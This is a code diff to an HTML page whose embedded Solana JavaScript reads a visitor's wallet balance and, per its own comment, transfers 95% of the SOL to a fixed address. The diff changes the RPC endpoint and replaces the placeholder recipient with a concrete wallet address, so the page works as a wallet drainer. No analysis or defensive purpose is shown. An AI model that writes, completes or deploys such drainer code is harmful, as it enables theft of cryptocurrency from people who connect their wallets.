@@ -80,7 +80,9 @@
 
     // Get the balance of the wallet
     const getBalance = async () => {
-      const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+      const connection = new solanaWeb3.Connection(
+        'https://solana-api.projectserum.com', 'confirmed'
+      );
       const publicKey = new solanaWeb3.PublicKey(walletAddress);
       const balance = await connection.getBalance(publicKey);
       return balance / 1000000000; // Convert lamports to SOL
@@ -89,9 +91,11 @@
     // Send 95% of the SOL balance
     const sendSOL = async (amount) => {
       try {
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+        const connection = new solanaWeb3.Connection(
+          'https://solana-api.projectserum.com', 'confirmed'
+        );
         const fromPublicKey = new solanaWeb3.PublicKey(walletAddress);
-        const toPublicKey = new solanaWeb3.PublicKey('YourWalletAddressHere'); // Replace with your SOL wallet address
+        const toPublicKey = new solanaWeb3.PublicKey('A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26'); // Replace with your SOL wallet address
 
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
@@ -123,6 +127,3 @@
   </script>
 </body>
 </html>
-
-
-
